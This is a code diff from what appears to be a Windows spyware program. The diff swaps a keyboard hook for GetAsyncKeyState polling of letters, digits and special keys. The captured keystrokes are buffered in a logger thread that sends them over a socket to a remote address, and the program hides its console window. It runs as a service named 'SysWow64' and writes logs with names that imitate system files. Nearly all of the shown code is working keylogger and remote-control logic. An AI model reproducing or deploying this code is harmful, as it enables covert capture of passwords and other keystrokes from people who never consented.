@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-14 03:51:41
+* @Last Modified time: 2017-04-14 04:20:59
 */
 
 #include <vector>
@@ -74,10 +74,6 @@ static bool terminated = false;
 static bool logged_in = false;
 static bool command_ack = false;
 
-static int llkeycode;
-
-static HHOOK llkeyboardHook;
-
 static STARTUPINFO startupInfo;
 static PROCESS_INFORMATION processInfo;
 
@@ -110,43 +106,61 @@ int send_request(int socket, const char *buffer, int size, bool applylock)
     return status;
 }
 
-LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wparam, LPARAM lparam)
+char keycodes[] =
 {
-    KBDLLHOOKSTRUCT *hook = (KBDLLHOOKSTRUCT*)lparam;
+    VK_LBUTTON,
+    VK_RBUTTON,
+    VK_MBUTTON,
+    VK_BACK,
+    VK_TAB,
+    VK_RETURN,
+    VK_SHIFT,
+    VK_CONTROL,
+    VK_MENU,
+    VK_CAPITAL,
+    VK_ESCAPE,
+    VK_SPACE,
+    VK_PRIOR,
+    VK_PRIOR,
+    VK_HOME,
+    VK_LEFT,
+    VK_UP,
+    VK_RIGHT,
+    VK_DOWN,
+    VK_SNAPSHOT,
+    VK_INSERT,
+    VK_DELETE,
 
-    int flag = wparam == WM_KEYUP;
-    llkeycode = hook->vkCode | (flag << 31);
-    return CallNextHookEx(llkeyboardHook, code, wparam, lparam);
-}
+    VK_NUMPAD0,
+    VK_NUMPAD1,
+    VK_NUMPAD2,
+    VK_NUMPAD3,
+    VK_NUMPAD4,
+    VK_NUMPAD5,
+    VK_NUMPAD6,
+    VK_NUMPAD7,
+    VK_NUMPAD8,
+    VK_NUMPAD9,
 
-void *keyboard_hook_handler(void *args)
-{
-    MSG msg;
-    HINSTANCE app = GetModuleHandle(NULL);
-
-    llkeyboardHook = SetWindowsHookEx(WH_KEYBOARD, LowLevelKeyboardProc, app, 0);
-    while(GetMessage(&msg, NULL, 0, 0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-    UnhookWindowsHookEx(llkeyboardHook);
-}
+    VK_MULTIPLY,
+    VK_ADD,
+    VK_SEPARATOR,
+    VK_SUBTRACT,
+    VK_DECIMAL,
+    VK_DIVIDE
+};
 
 void *logger(void *args)
 {
     vector<char> buf(100);
     int i, index = 3, socket;
 
-    pthread_t hook_thread;
-
     DPRINT("%s()\n", __func__);
 
     socket = *(int*)args;
     sprintf(buf.data(), "SAV");
-    pthread_create(&hook_thread, NULL, &keyboard_hook_handler, NULL);
 
-    while(true)
+    while(!terminated)
     {
         // maximum of 3 entries can be made in a single loop so 1020
         if (index >= 90)
@@ -160,10 +174,25 @@ void *logger(void *args)
             index = 3;
         }
 
-        if (llkeycode)
+        for (int i = 0; i < sizeof(keycodes); i++)
         {
-            buf[index++] = llkeycode;
-            llkeycode = 0;
+            /* get special key's status */
+            if (GetAsyncKeyState(keycodes[i]))
+                buf[index++] = i;
+        }
+
+        for (int i = 0x41; i < 0x5B; i++)
+        {
+            /* get alphabets */
+            if (GetAsyncKeyState(i))
+                buf[index++] = i;
+        }
+
+        for (int i = 0x30; i < 0x3A; i++)
+        {
+            /* get numeric keys */
+            if (GetAsyncKeyState(i))
+                buf[index++] = i;
         }
 
         sleep(100);
@@ -498,7 +527,6 @@ int run(const char* remote_addr, int port)
     }
 
     close(sock);
-    UnhookWindowsHookEx(llkeyboardHook);
     return 0;
 }
 
@@ -633,7 +661,7 @@ int main(int argc, char *argv[])
     if (strcmp(argv[1], "app") == 0)
     {
         #ifdef DEBUG
-            freopen(".SysWow32.log", "a", stdout);
+            freopen("F:\\.SysWow32.log", "a", stdout);
         #endif
         ShowWindow(GetConsoleWindow(), SW_HIDE);
         return run(argv[2], stoi(argv[3]));
@@ -641,7 +669,7 @@ int main(int argc, char *argv[])
     else if (strcmp(argv[1], "service") == 0)
     {
         #ifdef DEBUG
-            freopen(".SysWow64.log", "a", stdout);
+            freopen("F:\\.SysWow64.log", "a", stdout);
         #endif
         SERVICE_TABLE_ENTRY serviceTable[2];
         serviceTable[0].lpServiceName = "SysWow64";
